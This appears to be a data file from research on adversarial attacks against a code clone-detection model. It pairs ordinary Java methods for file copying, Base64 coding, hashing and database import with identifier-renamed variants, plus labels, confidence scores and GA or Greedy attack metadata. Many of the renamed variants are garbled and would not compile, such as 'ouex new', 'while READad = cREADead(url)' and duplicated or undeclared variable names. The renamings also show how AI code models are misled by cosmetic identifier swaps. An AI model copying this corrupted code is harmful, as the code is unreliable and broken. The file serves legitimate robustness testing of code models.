                    throw new CampoMalDelimitadoEmRegistroDoArquivoImportado(registro);
                }
                vSIGLA = campos[CampoDoArquivoDosEmissoresDeTitulosFinanceiros.SIGLA.ordinal()];
                vNOME = campos[CampoDoArquivoDosEmissoresDeTitulosFinanceiros.NOME.ordinal()];
                String cnpjTmp = campos[CampoDoArquivoDosEmissoresDeTitulosFinanceiros.CNPJ.ordinal()];
                if (cnpjTmp != null && cnpjTmp.trim().length() > 0) {
                    vCNPJ = new BigDecimal(cnpjTmp);
                } else {
                    vCNPJ = null;
                }
                String dataDaCriacaoTmp = campos[CampoDoArquivoDosEmissoresDeTitulosFinanceiros.DATA_CRIACAO.ordinal()];
                if (dataDaCriacaoTmp != null && dataDaCriacaoTmp.trim().length() > 0) {
                    int dia = Integer.parseInt(dataDaCriacaoTmp.substring(6, 8)), mes = Integer.parseInt(dataDaCriacaoTmp.substring(4, 6)) - 1, ano = Integer.parseInt(dataDaCriacaoTmp.substring(0, 4));
                    Calendar calendario = Calendar.getInstance();
                    calendario.clear();
                    calendario.set(ano, mes, dia);
                    vDATA_CRIACAO = new java.sql.Date(calendario.getTimeInMillis());
                } else {
                    vDATA_CRIACAO = null;
                }
                stmtDestino.setStringAtName(""SIGLA"", vSIGLA);
                stmtDestino.setStringAtName(""NOME"", vNOME);
                stmtDestino.setBigDecimalAtName(""CNPJ"", vCNPJ);
                stmtDestino.setDateAtName(""DATA_CRIACAO"", vDATA_CRIACAO);
                int contagemDasInsercoes = stmtDestino.executeUpdate();
                quantidadeDeRegistrosImportada++;
                double percentualCompleto = (double) quantidadeDeRegistrosImportada / quantidadeDeRegistrosEstimada * 100;
                pAndamento.setPercentualCompleto((int) percentualCompleto);
            }
            conDestino.commit();
        } catch (Exception ex) {
            conDestino.rollback();
            ProblemaNaImportacaoDeArquivo problemaDetalhado = new ProblemaNaImportacaoDeArquivo();
            problemaDetalhado.nomeDoArquivo = pArquivoTXT.getName();
            problemaDetalhado.linhaProblematicaDoArquivo = numeroDoRegistro;
            problemaDetalhado.detalhesSobreOProblema = ex;
            throw problemaDetalhado;
        } finally {
            pAndamento.setPercentualCompleto(100);
            in.close();
            if (stmtLimpezaInicialDestino != null && (!stmtLimpezaInicialDestino.isClosed())) {
                stmtLimpezaInicialDestino.close();
            }
            if (stmtDestino != null && (!stmtDestino.isClosed())) {
                stmtDestino.close();
            }
        }
    }
 <SPLIT>     private void readVersion() {
        URL url = ClassLoader.getSystemResource(""version"");
        if (url == null) {
            return;
        }
        BufferedReader reader = null;
        String line = null;
        try {
            reader = new BufferedReader(new InputStreamReader(url.openStream()));
            while ((line = reader.readLine()) != null) {
                if (line.startsWith(""Version="")) {
                    version = (line.split(""=""))[1];
                }
                if (line.startsWith(""Revision="")) {
                    revision = (line.split(""=""))[1];
                }
                if (line.startsWith(""Date="")) {
                    String sSec = (line.split(""=""))[1];
                    Long lSec = Long.valueOf(sSec);
                    compileDate = new Date(lSec);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return;
    }
",708,,LABEL_0,LABEL_1,,-4,"importarEmissoresDosTitulosFinanceiros,pArquivoTXT,pAndamento,numeroDoRegistro,in,stmtLimpezaInicialDestino,sql,stmtDestino,TAMANHO_DO_CABECALHO_DO_ARQUIVO,TAMANHO_DO_RODAPE_DO_ARQUIVO,TAMANHO_DOS_METADADOS_DO_ARQUIVO,TAMANHO_MEDIO_POR_REGISTRO,tamanhoDosArquivos,quantidadeDeRegistrosEstimada,registro,campos",,,,0,,0,Greedy,1,0.000925286610921224,,[]
294,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static void main(String args[]) throws IOException {
        String inFileName = args[0];
        String outFileName = args[1];
        long position = 0L;
        try {
            position = Long.parseLong(args[2]);
        } catch (NumberFormatException nfex1) {
            try {
                position = Long.parseLong(args[2], 16);
            } catch (NumberFormatException nfex2) {
                System.err.println(""Wrong offset"");
                System.exit(0);
            }
        }
        if (position < 1L) {
            System.err.println(""Wrong offset. Must be more than 0"");
            System.exit(0);
        }
        System.out.println(""Copying  input: "" + inFileName);
        System.out.println(""        output: "" + outFileName);
        System.out.println(""          from: "" + position);
        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(inFileName));
        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(outFileName));
        bis.skip(position);
        for (byte[] b = new byte[1]; bis.read(b) > 0; bos.write(b)) ;
        bis.close();
        bos.close();
    }
",194,"    public static boolean decodeFileFromFiles(String inFile, String outfolder) {
        boolean open = false;
        java.io.InputStream cin = null;
        java.io.OutputStream ex = null;
        try {
            cin = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(inFile)), Base64.DECODE);
            ouex new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfolder));
            byte[] url = new byte[65536];
            int READ = -1;
            while READad = cREADead(url)) >= 0) {
                ex.write(url, 0, READ);
            }
            open = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                cin.close();
            } catch (Exception exc) {
            }
            try {
                ex.close();
            } catch (Exception exc) {
            }
        }
        return open;
    }
",LABEL_1,LABEL_1,0.8255678415298462,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,"decodeFileToFile:decodeFileFromFiles,infile:inFile,outfile:outfolder,in:cin,out:ex,buffer:url,read:READ,success:open,",0,GA,500,0.18258203268051149,ga,[]
295,"    private static String getVersion() {
        debug.print("""");
        String version = null;
        String version_url = ""http://kmttg.googlecode.com/svn/trunk/version"";
        try {
            URL url = new URL(version_url);
            URLConnection con = url.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) version = inputLine;
            in.close();
        } catch (Exception ex) {
            version = null;
        }
        return version;
    }
 <SPLIT>     public static void copyFile(File src, File dest, int bufSize, boolean force) throws IOException {
        logger.info(""copyFile(File src="" + src + "", File dest="" + dest + "", int bufSize="" + bufSize + "", boolean force="" + force + "") - start"");
        File f = new File(Configuration.getArchiveDir());
        if (!f.exists()) {
            f.mkdir();
        }
        if (dest.exists()) {
            if (force) {
                dest.delete();
            } else {
                throw new IOException(""Cannot overwrite existing file: "" + dest);
            }
        }
        byte[] buffer = new byte[bufSize];
        int read = 0;
        InputStream in = null;
        OutputStream out = null;
        try {
            in = new FileInputStream(src);
            out = new FileOutputStream(dest);
            while (true) {
                read = in.read(buffer);
                if (read == -1) {
                    break;
                }
                out.write(buffer, 0, read);
            }
        } finally {
            if (in != null) {
                try {
                    in.close();
                } finally {
                    if (out != null) {
                        out.close();
                    }
                }
            }
        }
        logger.debug(""copyFile(File, File, int, boolean) - end"");
    }
",108,"    private static String  getVERSION() {
        debug.print("""");
        String source = null;
        String version_URL = ""http://kmttg.googlecode.com/svn/trunk/version"";
        try {
            URL file = new URL(version_URL);
            URLConnection cins= file.openConnection();
            BufferedReader b = new BufferedReader(new InputStreamReader(ins.getInputStream()));
            String outputFile;
            while outputFilene =bn.readLine()) != null) source = outputFile;
            b.close();
        } catch (Exception ex) {
            source = null;
        }
        return source;
    }
",LABEL_0,LABEL_0,0.6585972309112549,1,"getVersion,version,version_url,url,con,in,inputLine",,,,0,"getVersion: getVERSION,version:source,version_url:version_URL,url:file,con:ins,in:b,inputLine:outputFile,",0,GA,895,0.3226077914237976,ga,[]
296,"        public void open(Input input) throws IOException, ResolverException {
            if (!input.isUriDefinitive()) return;
            URI uri;
            try {
                uri = new URI(input.getUri());
            } catch (URISyntaxException e) {
                throw new ResolverException(e);
            }
            if (!uri.isAbsolute()) throw new ResolverException(""cannot open relative URI: "" + uri);
            URL url = new URL(uri.toASCIIString());
            input.setByteStream(url.openStream());
        }
 <SPLIT>     private void copyResourceToFile(final String resourceFilename, final String destinationFilename) throws IOException {
        InputStream inStream = null;
        OutputStream outStream = null;
        try {
            inStream = MatsimResource.getAsInputStream(resourceFilename);
            outStream = new FileOutputStream(destinationFilename);
            IOUtils.copyStream(inStream, outStream);
        } finally {
            if (inStream != null) {
                try {
                    inStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (outStream != null) {
                try {
                    outStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
",101,"        public void start(Input reader) throws IOException, ResolverException {
            if (!reader.isUriDefinitive()) return;
            URI file;
            try {
                ufile= new URI(reader.getUri());
            } catch (URISyntaxException e) {
                throw new ResolverException(e);
            }
            if (!file.isAbsolute()) throw new ResolverException(""cannot open relative URI: "" + file);
            URL uio= new URL(file.toASCIIString());
            reader.setByteStream(io.openStream());
        }
",LABEL_0,LABEL_0,0.6313024163246155,1,"open,input,uri,url",,,,0,"open:start,input:reader,uri:file,url:io,",0,GA,487,0.17291013399759927,ga,[]
297,"    private VelocityEngine newVelocityEngine() {
        VelocityEngine velocityEngine = null;
        InputStream is = null;
        try {
            URL url = ClassPathUtils.getResource(VELOCITY_PROPS_FILE);
            is = url.openStream();
            Properties props = new Properties();
            props.load(is);
            velocityEngine = new VelocityEngine(props);
            velocityEngine.init();
        } catch (Exception e) {
            throw new RuntimeException(""can not find velocity props file, file="" + VELOCITY_PROPS_FILE, e);
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }
        return velocityEngine;
    }
 <SPLIT>     public static void copy(File source, File dest) throws IOException {
        FileChannel in = null, out = null;
        try {
            in = new FileInputStream(source).getChannel();
            out = new FileOutputStream(dest).getChannel();
            long size = in.size();
            MappedByteBuffer buf = in.map(FileChannel.MapMode.READ_ONLY, 0, size);
            out.write(buf);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
",125,,LABEL_0,LABEL_0,LABEL_0,-1,"newVelocityEngine,velocityEngine,is,url,props",,,,0,,0,GA,1940,0.687566872437795,failed,[]
298,"    public static void copyFile(File in, File out) throws IOException {
        FileChannel sourceChannel = new FileInputStream(in).getChannel();
        FileChannel destinationChannel = new FileOutputStream(out).getChannel();
        sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
        sourceChannel.close();
        destinationChannel.close();
    }
 <SPLIT>     public static void main(String[] args) {
        String logFileName = args[0];
        int extractLineEvery = new Integer(args[1]).intValue();
        String filterToken = ""P0"";
        if (args.length > 2) {
            filterToken = args[2];
        }
        try {
            BufferedReader br = new BufferedReader(new FileReader(logFileName));
            BufferedWriter bw = new BufferedWriter(new FileWriter(new File(logFileName + "".trim"")));
            String readLine;
            int x = 0;
            while ((readLine = br.readLine()) != null) {
                if ((x++ % extractLineEvery == 0) && readLine.startsWith(filterToken)) {
                    bw.write(readLine + ""\n"");
                }
            }
            bw.flush();
            bw.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
",69,"    public static void copyFile(File url, File out) throws IOException {
        FileChannel s sourceSocket= new FileInputStream(url).getChannel();
        FileChannel destinationConnection = new FileOutputStream(out).getChannel();
         sourceSocket.transferTo(0,  sourceSocket.size(), destinationConnection);
         sourceSocket.close();
        destinationConnection.close();
    }
",LABEL_1,LABEL_1,0.7254418730735779,1,"copyFile,in,out,sourceChannel,destinationChannel",,,,3,"copyFile:copyFile,in:url,out:out,sourceChannel: sourceSocket,destinationChannel:destinationConnection,",2,GA,227,0.08152757485707601,ga,[]
299,"    public static boolean encodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static void copyFile(File in, File out) throws Exception {
        FileChannel sourceChannel = new FileInputStream(in).getChannel();
        FileChannel destinationChannel = new FileOutputStream(out).getChannel();
        sourceChannel.transferTo(0, sourceChannel.size(), destinationChannel);
        sourceChannel.close();
        destinationChannel.close();
    }
",194,"    public static boolean encodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream socket = null;
        java.io.OutputStream conn = null;
        try {
            socket = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            conn = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] url = new byte[65536];
            int read = -1;
            while ((rread= sockreadead(url)) >= 0) {
                conn.write(url, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                socket.close();
            } catch (Exception exc) {
            }
            try {
                conn.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",LABEL_1,LABEL_1,0.5104409456253052,1,"encodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,12,"encodeFileToFile:encodeFileToFile,infile:infile,outfile:outfile,in:socket,out:conn,buffer:url,read:read,success:success,",5,GA,400,0.14395010471343994,ga,[]
300,"    @Override
    public void alterar(Disciplina t) throws Exception {
        PreparedStatement stmt = null;
        String sql = ""UPDATE disciplina SET nm_disciplina = ?, cod_disciplina = ? WHERE id_disciplina = ?"";
        try {
            stmt = conexao.prepareStatement(sql);
            stmt.setString(1, t.getNomeDisciplina());
            stmt.setString(2, t.getCodDisciplina());
            stmt.setInt(3, t.getIdDisciplina());
            stmt.executeUpdate();
            conexao.commit();
            int id_disciplina = t.getIdDisciplina();
            excluirTopico(t.getIdDisciplina());
            for (Topico item : t.getTopicos()) {
                criarTopico(item, id_disciplina);
            }
        } catch (SQLException e) {
            conexao.rollback();
            throw e;
        }
    }
 <SPLIT>     public static URLConnection openProxiedConnection(URL url) throws IOException {
        if (proxyHost != null) {
            System.getProperties().put(""proxySet"", ""true"");
            System.getProperties().put(""proxyHost"", proxyHost);
            System.getProperties().put(""proxyPort"", proxyPort);
        }
        URLConnection cnx = url.openConnection();
        if (proxyUsername != null) {
            cnx.setRequestProperty(""Proxy-Authorization"", proxyEncodedPassword);
        }
        return cnx;
    }
",143,,LABEL_0,LABEL_0,LABEL_0,-1,"alterar,t,stmt,sql,id_disciplina,item",,,,0,,0,GA,2208,0.7861261129379272,failed,[]
301,"    public static void makeBackup(File dir, String sourcedir, String destinationdir, String destinationDirEnding) {
        String[] files;
        files = dir.list();
        File checkdir = new File(destinationdir + System.getProperty(""file.separator"") + destinationDirEnding);
        if (!checkdir.isDirectory()) {
            checkdir.mkdir();
        }
        ;
        Date date = new Date();
        long msec = date.getTime();
        checkdir.setLastModified(msec);
        File checkFile = new File(checkdir + System.getProperty(""file.separator"") + ""azureus.config"");
        if (checkFile.exists()) {
            checkFile.setLastModified(msec);
        }
        try {
            for (int i = 0; i < files.length; i++) {
                File f = new File(dir, files[i]);
                File g = new File(files[i]);
                if (f.isDirectory()) {
                } else {
                    String destinationFile = checkdir + System.getProperty(""file.separator"") + g;
                    String sourceFile = sourcedir + System.getProperty(""file.separator"") + g;
                    FileInputStream infile = new FileInputStream(sourceFile);
                    FileOutputStream outfile = new FileOutputStream(destinationFile);
                    int c;
                    while ((c = infile.read()) != -1) outfile.write(c);
                    infile.close();
                    outfile.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",294,"    public static void makeBackup(File url, String ssodedIR, String destinationdir, String destinationDirEnding) {
        String[] files;
        files = url.list();
        File checkdir = new File(destinationdir + System.getProperty(""file.separator"") + destinationDirEnding);
        if (!checkdir.isDirectory()) {
            checkdir.mkdir();
        }
        ;
        Date date = new Date();
        long msec = date.getTime();
        checkdir.setLastModified(msec);
        File checkFile = new File(checkdir + System.getProperty(""file.separator"") + ""azureus.config"");
        if (checkFile.exists()) {
            checkFile.setLastModified(msec);
        }
        try {
            for (int i = 0; i < files.length; i++) {
                File f = new File(url, files[i]);
                File pg = new File(files[i]);
                if (f.isDirectory()) {
                } else {
                    String ddestinationFile= checkdir + System.getProperty(""file.separator"") + pg;
                    String sourceFile = ssodedIR + System.getProperty(""file.separator"") + pg;
                    FileInputStream infile = new FileInputStream(sourceFile);
                    FileOutputStream exstream = new FileOutputStream(destinationFile);
                    int c;
                    while ((cc= infile.read()) != -1) exstream.write(c);
                    infile.close();
                    exstream.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",LABEL_1,LABEL_1,0.6676918268203735,1,"makeBackup,dir,sourcedir,destinationdir,destinationDirEnding,files,checkdir,date,msec,checkFile,i,f,g,destinationFile,sourceFile,infile,outfile,c",,,,41,"makeBackup:makeBackup,dir:url,sourcedir:ssodedIR,destinationdir:destinationdir,destinationDirEnding:destinationDirEnding,files:files,checkdir:checkdir,date:date,msec:msec,checkFile:checkFile,i:i,f:f,g:pg,destinationFile:destinationFile,sourceFile:sourceFile,infile:infile,outfile:exstream,c:c,",14,GA,886,0.3482072194417318,ga,[]
302,"    public static String getFile(String serviceName, String wsdlLocation, String endpoint) throws AxisFault {
        mLog.debug(""Downloading WSDL file from: "" + wsdlLocation);
        mLog.debug(""Received endpoint: "" + endpoint);
        String fileLocation = null;
        try {
            String tempDir = System.getProperty(""java.io.tmpdir"");
            URL url = new URL(wsdlLocation);
            String WSDLFile = tempDir + File.separator + serviceName + "".wsdl"";
            String tmpWSDLFile = WSDLFile + "".tmp"";
            File inputFile = new File(WSDLFile);
            File tmpFile = new File(tmpWSDLFile);
            if (!inputFile.exists() || inputFile.length() == 0) {
                mLog.debug(""Downloading the WSDL"");
                inputFile.createNewFile();
                InputStream in = url.openStream();
                FileOutputStream out = new FileOutputStream(inputFile);
                URLConnection con = url.openConnection();
                int fileLength = con.getContentLength();
                ReadableByteChannel channelIn = Channels.newChannel(in);
                FileChannel channelOut = out.getChannel();
                channelOut.transferFrom(channelIn, 0, fileLength);
                channelIn.close();
                channelOut.close();
                out.flush();
                out.close();
                in.close();
                Document tmpDocument = XMLUtils.newDocument(new FileInputStream(inputFile));
                NodeList nl1 = tmpDocument.getElementsByTagName(""wsdlsoap:address"");
                for (int i = 0; i < nl1.getLength(); i++) {
                    Node node1 = nl1.item(i);
                    if (node1.getNodeName().equals(""wsdlsoap:address"")) {
                        ((Element) node1).setAttribute(""location"", endpoint);
                    }
                }
                FileOutputStream tmpOut = new FileOutputStream(tmpFile);
                XMLUtils.DocumentToStream(tmpDocument, tmpOut);
                tmpOut.flush();
                tmpOut.close();
                boolean retVal = inputFile.delete();
                if (retVal) {
                    retVal = tmpFile.renameTo(new File(WSDLFile));
                }
                mLog.debug(""Return Value: "" + retVal);
            } else {
                mLog.debug(""The WSDL is already at the ServiceProvider"");
            }
            fileLocation = WSDLFile;
        } catch (MalformedURLException mx) {
            mLog.error(""MalformedURLException: "" + mx.getMessage() + "", cause: "" + mx.getCause().getMessage());
            throw new AxisFault(mx.getMessage(), mx.getCause());
        } catch (IOException ix) {
            mLog.error(""IOException: "" + ix.getMessage() + "", cause: "" + ix.getCause().getMessage());
            throw new AxisFault(ix.getMessage(), ix.getCause());
        } catch (ParserConfigurationException px) {
            mLog.error(""ParserConfigurationException: "" + px.getMessage() + "", cause: "" + px.getCause().getMessage());
            throw new AxisFault(px.getMessage(), px.getCause());
        } catch (SAXException sx) {
            mLog.error(""SAXException: "" + sx.getMessage() + "", cause: "" + sx.getCause().getMessage());
            throw new AxisFault(sx.getMessage(), sx.getCause());
        }
        return fileLocation;
    }
 <SPLIT>     public static void makeBackup(File dir, String sourcedir, String destinationdir, String destinationDirEnding) {
        String[] files;
        files = dir.list();
        File checkdir = new File(destinationdir + System.getProperty(""file.separator"") + destinationDirEnding);
        if (!checkdir.isDirectory()) {
            checkdir.mkdir();
        }
        ;
        Date date = new Date();
        long msec = date.getTime();
        checkdir.setLastModified(msec);
        File checkFile = new File(checkdir + System.getProperty(""file.separator"") + ""azureus.config"");
        if (checkFile.exists()) {
            checkFile.setLastModified(msec);
        }
        try {
            for (int i = 0; i < files.length; i++) {
                File f = new File(dir, files[i]);
                File g = new File(files[i]);
                if (f.isDirectory()) {
                } else {
                    String destinationFile = checkdir + System.getProperty(""file.separator"") + g;
                    String sourceFile = sourcedir + System.getProperty(""file.separator"") + g;
                    FileInputStream infile = new FileInputStream(sourceFile);
                    FileOutputStream outfile = new FileOutputStream(destinationFile);
                    int c;
                    while ((c = infile.read()) != -1) outfile.write(c);
                    infile.close();
                    outfile.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",631,,LABEL_1,LABEL_0,,-4,"getFile,serviceName,wsdlLocation,endpoint,fileLocation,tempDir,url,WSDLFile,tmpWSDLFile,inputFile,tmpFile,in,out,con,fileLength,channelIn,channelOut,tmpDocument,nl1,i,node1,tmpOut,retVal",,,,0,,0,Greedy,1,0.0007652759552001954,,[]
303,"    private String hashPassword(String password) throws NoSuchAlgorithmException {
        String hash = null;
        MessageDigest md = MessageDigest.getInstance(""SHA"");
        log.debug(""secure hash on password "" + password);
        md.update(password.getBytes());
        hash = new String(Base64.encodeBase64(md.digest()));
        log.debug(""returning hash "" + hash);
        return hash;
    }
 <SPLIT>     private void generateDeviceUUID() {
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(deviceType.getBytes());
            md5.update(internalId.getBytes());
            md5.update(bindAddress.getHostName().getBytes());
            StringBuffer hexString = new StringBuffer();
            byte[] digest = md5.digest();
            for (int i = 0; i < digest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & digest[i]));
            }
            uuid = hexString.toString().toUpperCase();
        } catch (Exception ex) {
            RuntimeException runTimeEx = new RuntimeException(""Unexpected error during MD5 hash creation, check your JRE"");
            runTimeEx.initCause(ex);
            throw runTimeEx;
        }
    }
",83,,LABEL_1,LABEL_1,LABEL_1,-1,"hashPassword,password,hash,md",,,,0,,0,GA,1577,0.5567005038261413,failed,[]
304,"    public InputStream loadResource(String location) throws GenericConfigException {
        URL url = getURL(location);
        try {
            return url.openStream();
        } catch (java.io.IOException e) {
            throw new GenericConfigException(""Error opening URL resource at location ["" + url.toExternalForm() + ""]"", e);
        }
    }
 <SPLIT>     public static void hash(String... plainTexts) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            for (String plainText : plainTexts) md.update(plainText.getBytes());
            byte b[] = md.digest();
            int i;
            StringBuffer buf = new StringBuffer("""");
            for (int offset = 0; offset < b.length; offset++) {
                i = b[offset];
                if (i < 0) i += 256;
                if (i < 16) buf.append(""0"");
                buf.append(Integer.toHexString(i));
            }
            String str = buf.toString();
            System.out.println(""result: "" + buf.toString());
            System.out.println(""result: "" + buf.toString().substring(8, 24));
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }
",63,,LABEL_0,LABEL_0,LABEL_0,-1,"loadResource,location,url",,,,0,,0,GA,1173,0.41441426674524945,failed,[]
305,"    protected Control createDialogArea(Composite parent) {
        Composite composite = (Composite) super.createDialogArea(parent);
        setTitle(DialogsMessages.getString(""LicenseDialog.Caption""));
        setMessage(DialogsMessages.getString(""LicenseDialog.Explanation""));
        Composite content = new Composite(composite, SWT.NONE);
        content.setLayoutData(new GridData(GridData.FILL_BOTH));
        final int ncol = 1;
        GridLayout layout = new GridLayout(1, false);
        layout.numColumns = ncol;
        content.setLayout(layout);
        Browser browser = null;
        Text text = null;
        try {
            browser = new Browser(content, SWT.NONE);
            browser.setLayoutData(new GridData(GridData.FILL_BOTH));
        } catch (Throwable t) {
            text = new Text(content, SWT.MULTI | SWT.WRAP | SWT.VERTICAL);
            text.setLayoutData(new GridData(GridData.FILL_BOTH));
        }
        URL url = PalobrowserPlugin.getDefault().getBundle().getResource(browser != null ? ""license.html"" : ""license.txt"");
        InputStream in = null;
        BufferedReader r = null;
        StringBuffer sb = new StringBuffer();
        try {
            in = url.openStream();
            r = new BufferedReader(new InputStreamReader(in, ""ISO-8859-1""));
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append(""\r\n"");
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (r != null) {
                try {
                    r.close();
                } catch (IOException e) {
                }
            }
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                }
            }
        }
        if (browser != null) browser.setText(sb.toString()); else text.setText(sb.toString());
        return composite;
    }
 <SPLIT>     public static String SHA(String source) {
        logger.info(source);
        String result = null;
        try {
            MessageDigest digest = MessageDigest.getInstance(""SHA"");
            digest.update(source.getBytes());
            byte[] bytes = digest.digest();
            result = EncodeUtils.hexEncode(bytes);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        logger.info(result);
        return result;
    }
",382,,LABEL_0,LABEL_0,LABEL_0,-1,"createDialogArea,parent,composite,content,ncol,layout,numColumns,browser,text,url,in,r,sb,line,e",,,,0,,0,GA,5444,2.0116358558336893,failed,[]
306,"    public void write() throws IOException {
        JarOutputStream jarOut = new JarOutputStream(outputStream, manifest);
        if (includeJars != null) {
            HashSet allEntries = new HashSet(includeJars);
            if (!ignoreDependencies) expandSet(allEntries);
            for (Iterator iterator = allEntries.iterator(); iterator.hasNext(); ) {
                JarFile jar = getJarFile(iterator.next());
                Enumeration jarEntries = jar.entries();
                while (jarEntries.hasMoreElements()) {
                    ZipEntry o1 = (ZipEntry) jarEntries.nextElement();
                    if (o1.getName().equalsIgnoreCase(""META-INF/MANIFEST.MF"") || o1.getSize() <= 0) continue;
                    jarOut.putNextEntry(o1);
                    InputStream entryStream = jar.getInputStream(o1);
                    IOUtils.copy(entryStream, jarOut);
                    jarOut.closeEntry();
                }
            }
        }
        jarOut.finish();
        jarOut.close();
    }
 <SPLIT>     public static void main(String[] args) throws Exception {
        String linesep = System.getProperty(""line.separator"");
        FileOutputStream fos = new FileOutputStream(new File(""lib-licenses.txt""));
        fos.write(new String(""JCP contains the following libraries. Please read this for comments on copyright etc."" + linesep + linesep).getBytes());
